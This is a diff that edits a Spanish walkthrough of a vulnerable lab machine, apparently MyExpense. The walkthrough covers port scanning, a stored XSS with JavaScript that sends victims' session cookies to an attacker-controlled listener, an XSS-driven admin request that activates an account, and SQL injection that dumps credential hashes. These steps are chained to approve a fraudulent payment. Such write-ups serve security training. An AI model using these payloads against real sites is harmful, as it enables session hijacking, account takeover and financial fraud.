@@ -1,142 +1,142 @@
-----------
+## Enumeración
 
-**IP:**
-**SO:**
-**Vulns:**
+Lo primero que vamos a hacer es identificar la máquina víctima. Como nos encontramos en el mismo segmento de red, utilizaremos [[Arp-Scan]] para descubrir los dispositivos disponibles:
 
-------------------------------------------
-
-Para esta maquina se tiene que reconfigurar la interfaz de red, esto no es mas que aplastar la tecla e en el panel del bios y modificar la parte del `ro quiet` como `rw init=/bin/bash`, luego un Ctrl + x , ya con esto obtenemos una bash, recordar revisar cual es la interfaz de red `ip a` donde el nombre que sea lo modificamos en el archivo `/etc/network/interfaces.d` correctamente.
-
-En este punto lo primero que se va a hacer es analizar cual es la maquina, en este caso al estar en el mismo segmento de red vamos a usar [[Arp-Scan]] para obtener la maquina:
-
-```bash
+```
 arp-scan -I eth0 --localnet --ignoredups
 ```
 
 ![[Pasted image 20250824203224.png]]
 
-como podemos observar ya tenemos la IP de la maquina, esto es fácil de ver ya que es una vmware por lo tanto es `192.168.1.103`.
+Como podemos observar, ya tenemos la dirección IP de la máquina víctima. En este caso, al tratarse de una máquina virtual en VMware, identificamos la dirección `192.168.1.103`.
 
-Vamos con ayuda de ping a ver que tipo de sistema esta corriendo:
+Vamos a utilizar `ping` para comprobar si la máquina está activa y obtener una primera pista sobre el sistema operativo:
 
-```bash
+```
 ping -c 1 192.168.1.103
 ```
 
 ![[Pasted image 20250824204137.png]]
 
-vemos un `ttl=64` lo que nos dice que estamos ante un sistem Linux.
+Como podemos ver, obtenemos un `TTL=64`, lo que nos permite sospechar que estamos ante un sistema Linux. Sin embargo, este valor es solo una referencia y no confirma por sí solo el sistema operativo.
 
-ya con esto vamos a comenzar con el escaneo de puertos con ayuda de [[Nmap]]:
+Ahora, vamos a comenzar con el escaneo de puertos utilizando [[Nmap]]:
 
-```bash
+```
 nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.103 -oG allPorts
 ```
 
 ![[Pasted image 20250824204355.png]]
 
-ahora conociendo los puertos abiertos vamos a realizar un escaneo mucho mas preciso para los puertos abiertos:
+Una vez identificados los puertos abiertos, vamos a realizar un escaneo más preciso para obtener información sobre los servicios y sus versiónes:
 
-```bash
+```
 nmap -p80,37541,45353,46527,59679 -sCV 192.168.1.103 -oN target
 ```
 
 ![[Pasted image 20250824204602.png]]
 
-vemos ya información mucho mas preciso de los puertos abiertos. podemos aprovechar la version del puerto 80 para ver el codename de la maquina, con ayuda de launchpad.
+Como podemos observar, ahora tenemos información más detallada de los servicios disponibles. Podemos aprovechar la versión del servicio web que se ejecuta en el puerto 80 para investigar el _codename_ de la distribución mediante Launchpad.
 
 ![[Pasted image 20250824204802.png]]
-podemos ver que es una maquina Debian `Stretch`.
 
-En este punto vemos que tenemos el puerto `80` por lo que podemos ir a ver la web para ver que encontramos dentro:
+Como resultado de esta consulta, identificamos que se trata de una máquina con Debian Stretch.
+
+En este punto, sabemos que tenemos un servicio web en el puerto `80`, por lo que vamos a acceder a la página para comprobar qué encontramos:
 
 ![[Pasted image 20250824204914.png]]
 
-podemos ver el login y una web para crear una cuenta pero antes de comenzar con eso sigamos escaneando un poco la web a ver si logramos encontrar algo con ayuda de [[Gobuster]]
+Como podemos observar, tenemos una página de inicio de sesión y una opción para crear una cuenta. Sin embargo, antes de comenzar a probar estas funcionalidades, vamos a continuar enumerando la web para buscar otros recursos que puedan ser interesantes. Para ello, utilizaremos [[Gobuster]]:
 
-```bash
+```
 gobuster dir -u http://192.168.1.103 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
 ```
 
 ![[Pasted image 20250824205519.png]]
 
-podemos observar una ruta admin la cual es la siguiente:
+Como resultado, encontramos una ruta llamada `admin`. Vamos a acceder a ella para comprobar qué información nos proporciona:
 
 ![[Pasted image 20250824205556.png]]
 
-al parecer no podemos acceder a esta web a menos que tengamos credenciales, ahora vamos a tratar de hacer reconocimiento de nuevo con [[Gobuster]] pero ahora sobre el directorio admin a ver si descubrimos algo, además gracias la wappalyzer podemos observar que se esta usando como lenguaje php:
+Como podemos observar, no podemos acceder a esta sección sin disponer de las credenciales necesarias. Por lo tanto, vamos a continuar enumerando el directorio `admin` para comprobar si encontramos algún archivo que podamos investigar. Además, mediante Wappalyzer, podemos observar que la aplicación utiliza PHP.
+
 ![[Pasted image 20250824205732.png]]
 
-```bash
+Para profundizar en la enumeración, vamos a utilizar Gobuster con la extensión `.php`:
+
+```
 gobuster dir -u http://192.168.1.103/admin -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
 ```
 
 ![[Pasted image 20250824205855.png]]
 
-podemos observar que encontró dentro de admin un `admin.php` que contiene lo siguiente:
+Como resultado, encontramos el archivo `admin.php`. Vamos a acceder a él para comprobar qué información podemos obtener:
 
 ![[Pasted image 20250824205949.png]]
 
-podemos ver mucha información como que el admin es `rmasson` y muchos mas usuarios, a demás de sus roles y que claro nuestra cuenta ya se encuentra inactiva.
+Como podemos ver, la página muestra bastante información, entre ella el usuario administrador `rmasson`, otros usuarios y sus respectivos roles. También podemos observar que nuestra cuenta aparece como inactiva.
 
-Al pulsar sobre el `inactive` vemos lo siguiente:
+Al pulsar sobre el estado `inactive`, encontramos lo siguiente:
 
 ![[Pasted image 20250824210115.png]]
 
-en la url vemos lo que al parecer es un intento de activar la cuenta pero no podemos hacerlo.
+En la URL aparece lo que parece ser una petición para activar la cuenta. Sin embargo, desde nuestra sesión no conseguimos realizar la activación.
 
-Por el lore del ejercicio tenemos que el la persona se llama  `samuel` y que su contraseña era `fzghn4lw` pero no teníamos el usuario, lo que podemos hacer en este momento es ver el usuario en la tabla que es `slamotte` e intentar ingresar a la cuenta.
+Por la información del ejercicio, sabemos que la persona se llama `samuel` y que su contraseña era `fzghn4lw`, pero todavía no conocemos su nombre de usuario. Si revisamos la tabla de usuarios, encontramos que su cuenta corresponde a `slamotte`, por lo que vamos a intentar iniciar sesión con esas credenciales:
 
 ![[Pasted image 20250824210421.png]]
 
-vemos que nos dice que la cuenta se encuentra bloqueada. Por el momento no podemos hacer mucho por lo cual vemos si nos deja crear una cuenta sin mucha información:
+Como podemos observar, la aplicación nos indica que la cuenta está bloqueada. Por el momento, no podemos avanzar por esta vía, así que vamos a comprobar si es posible crear una cuenta nueva.
 
 ![[Pasted image 20250824210535.png]]
 
-ya llenamos los datos, pero el botón se encuentra deshabilitado, pero el como esta deshabilitado que es por cambio del mouse puede que sea solo mediante html por lo que podemos revisar a ver si lo podemos habilitar:
+Ya hemos rellenado los datos, pero el botón para crear la cuenta aparece deshabilitado. Como este comportamiento podría estar controlado únicamente desde el HTML de la página, vamos a inspeccionar el elemento para comprobar cómo está implementado.
 
 ![[Pasted image 20250824210722.png]]
 
-vemos que ese botón en especifico tiene  `disable=""` la cual podemos quitar a ver si nos deja continuar:
+Como podemos observar, el botón tiene el atributo `disabled=""`. Vamos a probar a quitarlo desde las herramientas de desarrollo del navegador para comprobar si podemos continuar:
 
 ![[Pasted image 20250824211029.png]]
 
-en efecto quitándolo podemos pasar.
+En efecto, al quitar el atributo, conseguimos habilitar el botón y continuar con el registro.
 
 ![[Pasted image 20250824211051.png]]
 
-como vemos la cuenta fue creada, ahora si revisamos la web de `/admin/admin.php` tendríamos que ver el nuevo usuario.
+Como vemos, la cuenta se ha creado correctamente. Ahora, si volvemos a revisar `/admin/admin.php`, deberíamos poder encontrar el nuevo usuario:
 
 ![[Pasted image 20250824211149.png]]
 
-pero vemos que esta inactivo, algo que si llama nuestra atención es que los valores del Firstname y Lastname están tal cual como los pusimos por lo que en esos campos y también en el usuario podremoa tratar de hacer un [[Cross-Site Scripting XSS]] tratando de cargar una alerta:
+Sin embargo, la cuenta aparece como inactiva. Algo que llama nuestra atención es que los valores de `Firstname` y `Lastname` se muestran tal como los introdujimos. Esto nos lleva a comprobar si esos campos, así como el nombre de usuario, son vulnerables a [[Cross-Site Scripting XSS]].
+
+## Explotación
+
+Para comenzar, vamos a probar si podemos introducir una alerta de JavaScript:
 
 ![[Pasted image 20250824211447.png]]
 
-vamos ahora a enviar para ver si logramos ver la alerta:
+Ahora, vamos a enviar los datos y comprobar si se ejecuta el código:
 
 ![[Pasted image 20250824211548.png]]
 
-vemos que tenemos la alerta lo que es buena señal y en realidad la alerta se repite por lo que podemos pensar que en cualquiera de los dos podemos ingresar scripts.
+Como podemos observar, conseguimos que aparezca la alerta. Además, el comportamiento se repite, lo que nos hace pensar que el contenido introducido en estos campos podría estar ejecutándose cada vez que se carga la página.
 
-En este punto lo que vamos a ver si logramos es robar alguna cookie de session de algún usuario que este continuamente ingresando a esta web, para esto es sencillo levantamos sun servidor al cual va a llegar la petición con la cookie y luego mediante un script externo en Java Script mediante un nuevo usuario vamos a intentar que el usuario nos envíe la cookie de session:
+En este punto, vamos a investigar si podemos aprovechar el XSS para obtener información de la sesión de otro usuario que visite esta web. Para ello, levantaremos un servidor que reciba las peticiónes y prepararemos un script externo de JavaScript que enviaremos mediante un nuevo usuario.
 
-Lo primero que vamos a hacer es crear el usuario que llame al script externo y levantar el servidor:
+Lo primero será crear el usuario que cargará el script externo y levantar el servidor que recibirá las peticiónes:
 
 ![[Pasted image 20250824212036.png]]
 
 ![[Pasted image 20250824212453.png]]
 
-enviamos y listo, pero antes de entrar nosotros lo que vamos a hacer es ver si nos llega una petición porque si es así alguien esta constantemente en la página:
+Una vez enviado el contenido, vamos a esperar antes de acceder nosotros mismos. Si recibimos alguna petición, tendremos indicios de que otro usuario está visitando la página de forma recurrente.
 
 ![[Pasted image 20250824212647.png]]
 
-como observamos tenemos peticiones lo que sugiere que alguien si esta en la web continuamente por lo que en este caso vamos a comenzar con la creación del script:
+Como podemos observar, estamos recibiendo peticiónes. Esto sugiere que alguien está accediendo a la web de forma continua, así que vamos a preparar el script para comprobar si podemos obtener la cookie de sesión.
 
-Lo primero es ver si logramos secuestrarle la cookie al usuario:
+El primer paso será intentar capturar la cookie del usuario que visita la página:
 
-```js
+```
 var request = new XMLHttpRequest();
 request.open('GET', "http://192.168.1.70/?cookie=" + document.cookie);
 request.send();
@@ -144,140 +144,158 @@ request.send();
 
 ![[Pasted image 20250824213044.png]]
 
-Como podemos ver logramos secuestrar la cookie por lo tanto vamos a acceder como el usuario y ver quien es el que nos dio acceso:
+Como podemos observar, conseguimos recibir la cookie de sesión. Por lo tanto, vamos a probarla en el navegador para identificar a qué usuario corresponde:
 
 ![[Pasted image 20250824213241.png]]
 
-al parecer es el usuario administrador pero nos dice que como administrador solo una persona puede estar dentro a la vez, pero ya sabemos quien es y en realidad es algo bueno ya que si lo analizamos un poco podemos hacer que mediante el script externo el usuario admin que esta monitoreando la web continuamente realize la petición para que active la cuenta.
+Al parecer, se trata del usuario administrador. Sin embargo, la aplicación nos indica que solo una persona puede estar conectada como administrador al mismo tiempo.
 
-La cuenta que vamos a activar es samuel y recordemos que al darle al activar nos salía:
+Aunque esto nos impide mantener una sesión simultánea con él, también nos proporciona una pista importante. Si analizamos el funcionamiento de la aplicación, podemos intentar que el administrador ejecute una petición en nuestro nombre para activar una cuenta.
+
+Recordemos que queremos activar la cuenta de `samuel`. Cuando pulsábamos sobre su estado, obteníamos la siguiente URL:
 
 ![[Pasted image 20250824210115.png]]
 
-lo que al parecer es una petición por get que activa la cuenta de samuel por lo que vamos a intentar que el administrador ejecute esa petición para activar nuestra cuenta con el script de la siguiente manera:
+Por lo tanto, parece que la aplicación utiliza una petición GET para cambiar el estado de la cuenta. Vamos a intentar que el administrador realice esa petición mediante el script externo, modificándolo de la siguiente manera:
 
-```bash
+```
 var request = new XMLHttpRequest();
 request.open('GET', "http://192.168.1.103/admin/admin.php?id=11&status=active");
 request.send();
 ```
 
-el nuevo script lo que hace es enviar la petición de quien cargue el script por lo que vamos a levantar el servidor para que se conecte al script y cuando tengamos la petición quiere decir que la cuenta se activo:
+El nuevo script hará que el navegador de quien lo cargue envíe la petición indicada. Ahora vamos a levantar el servidor y esperar a que se produzca una conexión. Si la petición se ejecuta con la sesión del administrador, podremos comprobar si la cuenta se ha activado.
 
 ![[Pasted image 20250824213951.png]]
 
-como vemos ya se denoto la petición y si vemos la pagina de `admin/admin.php` vamos a ver que se activo la cuenta:
+Como podemos observar, recibimos la petición. Ahora vamos a revisar nuevamente `/admin/admin.php` para comprobar si el estado de la cuenta ha cambiado:
 
 ![[Pasted image 20250824214036.png]]
 
-En este punto vamos ingresar a la cuenta:
+En efecto, la cuenta aparece activa. Por lo tanto, vamos a intentar iniciar sesión con las credenciales que encontramos anteriormente:
 
 ![[Pasted image 20250824214321.png]]
 
-como podemos observar ya logramos ingresar a la cuenta.
+Como podemos observar, conseguimos acceder a la cuenta.
 
 ![[Pasted image 20250824214405.png]]
 
-El objetivo es enviar una solicitud de pago que es esa por lo que vamos a enviarla.
+Una vez dentro, vemos que nuestro objetivo es enviar una solicitud de pago. Vamos a realizar el proceso para comprobar qué sucede:
 
 ![[Pasted image 20250824214500.png]]
 
-vemos que dice submitted pero lo que nosotros queremos es que este aceptada para poder retirar el pago, entonces vamos a intentar ver quien es el que se encarga de aceptar los pagos.
+Como resultado, la solicitud aparece como `submitted`. Sin embargo, nuestro objetivo es que sea aceptada para poder retirar el pago. Por lo tanto, vamos a investigar qué usuario se encarga de aprobar las solicitudes.
 
 ![[Pasted image 20250824214607.png]]
 
-revisando encontramos que nuestro manager es Manon Riviere, lo que quiere decir que posible mente el es el que nos tiene que aceptar el pago. Si lo revisamos veremos que este usuario es un manager y de forma general tiene que el tener alguna pagina extra desde la cual se aceptara los pagos, entonces el propósito en este punto es encontrar la forma de robarle la cuenta.
+Al revisar la información de la cuenta, encontramos que nuestro _manager_ es Manon Riviere. Esto nos hace pensar que podría ser la responsable de aprobar el pago.
+
+Si tenemos en cuenta que su cuenta tiene un rol diferente al nuestro, es posible que disponga de una sección adicional desde la que pueda gestionar las solicitudes. Por lo tanto, vamos a investigar si podemos acceder a esa cuenta.
 
 ![[Pasted image 20250824214843.png]]
 
-si observamos en el Home al parecer allí están algunos usuarios incluido el Manon Riviere lo que podríamos intentar es ver si logramos inyectar un XSS para robarle la cookie.
+Al revisar la página principal, encontramos información de varios usuarios, entre ellos Manon Riviere. Como ya hemos identificado una vulnerabilidad XSS, vamos a comprobar si podemos aprovecharla de nuevo para obtener la cookie de sesión de los usuarios que visitan esta sección.
 
-En este punto vamos a intentar lo mismo de antes para robarle la cookie a los usuarios del chat esperando también lograrlo obtener la que nos intereza:
+En este caso, vamos a utilizar un puerto diferente para evitar conflictos con el servidor anterior:
 
-```js
+```
 var request = new XMLHttpRequest();
 request.open('GET', "http://192.168.1.70:4646/?cookie=" + document.cookie);
 request.send();
 ```
 
-variamos un poco para evitar conflictos con el de la otra pagina.
-
-Ahora el mensaje malicioso lo veremos de la siguiente manera:
+Ahora, vamos a introducir el nuevo contenido en el mensaje y comprobar si se ejecuta:
 
 ![[Pasted image 20250824215548.png]]
 
-y una vez enviado esperamos a ver las conexiones en nuestro servidor:
+Una vez enviado, vamos a esperar las conexiones que lleguen a nuestro servidor:
 
 ![[Pasted image 20250824215638.png]]
 
-como podemos ver tenemos varias cuentas, recordemos que el usuario administrador no puede estar multiples veces dentro pero los demás puede que si por lo que vamos a intentar una por una las cookies a ver si llegamos a la cuenta de Manon Riviere:
+Como podemos observar, recibimos varias cookies de sesión. Recordemos que el administrador no puede mantener varias sesiones simultáneas, pero los demás usuarios podrían hacerlo. Por lo tanto, vamos a comprobar las cookies obtenidas hasta identificar la que corresponde a Manon Riviere.
 
-`1ua1glfeiqo3k7m1qd5gmr6495` esta es la cookie para Manon Riviere y ya estamos en us cuenta:
+La cookie que identificamos para Manon Riviere es:
+
+`1ua1glfeiqo3k7m1qd5gmr6495`
+
+Ahora, vamos a utilizarla para comprobar si podemos acceder a su cuenta:
 
 ![[Pasted image 20250824215914.png]]
 
-Listo ya estamos dentro por lo que vamos a ver los reportes  a ver con que nos encontramos:
+Perfecto, ya estamos dentro de la cuenta. Vamos a revisar los reportes para comprobar si encontramos nuestra solicitud de pago:
 
 ![[Pasted image 20250824215954.png]]
 
-vemos que sale nuestro pedido y lo vamos a aceptar para ver que sucede ya:
+Como podemos observar, aparece nuestra solicitud. Vamos a aprobarla para comprobar si con esto conseguimos completar el proceso:
 
 ![[Pasted image 20250824220051.png]]
 
-vemos que nos sale que el pago a sido validado pero no aceptado por lo que pude ser que el también tenga que manager o alguien mas que acepta las solicitudes:
+Sin embargo, la aplicación indica que el pago ha sido validado, pero todavía no ha sido aceptado. Por lo tanto, parece que existe otro nivel de aprobación y que Manon Riviere también necesita la autorización de su propio _manager_.
 
 ![[Pasted image 20250824220205.png]]
-Vemos que el también tiene un manager y al parecer es `Paul Baudouin` por lo que ahora vamos a intentar ingresar a la cuenta de este usuario, pero primero vemos si talvez el estaba en el chat y también logramos capturar su cookie de session:
+
+Como podemos observar, su _manager_ parece ser `Paul Baudouin`. Ahora vamos a intentar acceder a su cuenta. Primero, comprobaremos si también aparece en el chat y si conseguimos obtener su cookie de sesión.
 
 ![[Pasted image 20250824220400.png]]
 
-si esta en el chat pero comprobando con todas las cookies no podemos obtener la de el por lo que no esta pendiente del chat.
+En efecto, aparece en el chat. Sin embargo, después de probar las cookies que hemos capturado, no conseguimos identificar la suya. Esto podría indicar que no está visitando esa sección durante nuestras pruebas.
 
-Revisando la web en la subweb de `Renes` vemos algo familiar en la url:
+Como todavía no hemos encontrado una forma de acceder a su cuenta, vamos a seguir investigando la aplicación. Al revisar la sección de `Renes`, encontramos algo interesante en la URL:
 
 ![[Pasted image 20250824220521.png]]
 
-vemos algo como un `id=2` y esto talvez puede ser una [[SQLI]] así que vamos a intarlo:
+Como podemos observar, aparece un parámetro `id=2`. Esto nos hace sospechar que la aplicación podría estar consultando información de la base de datos mediante ese parámetro. Por lo tanto, vamos a comprobar si es vulnerable a [[SQLI]].
 
 ![[Pasted image 20250824220747.png]]
 
-vemos que si es vulnerable a [[SQLI]] por lo que vamos a explotarla:
+Como podemos ver, encontramos indicios de que el parámetro es vulnerable a SQL Injection. Vamos a profundizar en la prueba para determinar si podemos obtener información de la base de datos:
 
 ![[Pasted image 20250824220944.png]]
-vemos el 1 y 2 en la respuesta por lo que vamos a comenzar a inyectar comando:
+
+La respuesta muestra los valores `1` y `2`, lo que nos permite continuar investigando cómo se procesa la consulta:
 
 ![[Pasted image 20250824221058.png]]
-Listamos las bases de datos disponibles y la que llama la atención es la de `myexpense`.
+
+A partir de aquí, vamos a enumerar las bases de datos disponibles. Entre los resultados, encontramos una base de datos llamada `myexpense`, que resulta especialmente interesante para el contexto de la aplicación.
 
 ![[Pasted image 20250824221253.png]]
 
-Vemos una opción de `user`, vamos a investigar:
+Dentro de la base de datos, encontramos una tabla llamada `user`. Vamos a investigar su estructura para identificar qué información almacena:
+
 ![[Pasted image 20250824221433.png]]
 
-ahora vemos las opciones de `username` y `password` por lo que vamos a intentar ver que logramos obtener de alli:
+Como podemos observar, encontramos los campos `username` y `password`. Por lo tanto, vamos a comprobar si podemos recuperar los datos almacenados en esas columnas:
 
 ![[Pasted image 20250824221617.png]]
 
-vemos que obtuvimos todos los usuario y contraseñas pero el que nos interesa es el de `pbaudouin (64202ddd5fdea4cc5c2f856efef36e1a)` donde al parecer la contraseña esta encriptada por lo que vamos a tratar de regresarla a la normalidad, primero identificamos el hash con ayuda de alguna herramienta:
+Como resultado, obtenemos varios nombres de usuario y sus correspondientes valores de contraseña. El usuario que nos interesa es `pbaudouin`, cuyo valor almacenado es:
+
+`64202ddd5fdea4cc5c2f856efef36e1a`
+
+Por su formato, sospechamos que se trata de un hash MD5. Vamos a comprobarlo con una herramienta de identificación de hashes:
 
 ![[Pasted image 20250824222119.png]]
 
-como vemos es `MD5` por lo que podemos tratar de romperla en alguna web:
+Como podemos observar, la herramienta identifica el valor como MD5. Ahora vamos a intentar recuperar la contraseña original utilizando un servicio de búsqueda de hashes:
 
 ![[Pasted image 20250824222227.png]]
 
-la password al parecer es `HackMe` por lo que vamos a intentar ingresar con las credenciales:
+El resultado sugiere que la contraseña es `HackMe`. Con esto en mente, vamos a probar las credenciales para comprobar si podemos acceder a la cuenta de Paul Baudouin:
 
 ![[Pasted image 20250824222341.png]]
 
-ya logramos ingresar y si vemos tenemos una opción de `Exprense reports` por lo que vamos a ver si esta nuestro reporte:
+## Escalada de privilegios
+
+Perfecto, conseguimos iniciar sesión en la cuenta de Paul Baudouin. En este punto, hemos conseguido acceder a una cuenta con un nivel de responsabilidad superior dentro de la aplicación. Ahora vamos a revisar sus opciones para comprobar si podemos completar la aprobación que todavía está pendiente.
+
+Una vez dentro, encontramos una opción llamada `Expense reports`, así que vamos a revisarla para comprobar si aparece nuestra solicitud de pago:
 
 ![[Pasted image 20250824222427.png]]
 
-como podemos ver si esta por lo que vamos a aprobar el nuestro:
+Como podemos observar, nuestra solicitud aparece en la lista. Ahora vamos a aprobarla para comprobar si finalmente conseguimos completar el proceso:
 
 ![[Pasted image 20250824222458.png]]
 
-como vemos por fin ya esta nuestro pago y con esto nuestro objetivo principal.
+Como vemos, el pago queda aprobado. De esta manera, conseguimos completar el objetivo principal de la máquina.
 
-Maquina Terminada!!!!!!!
+**¡Máquina terminada!**
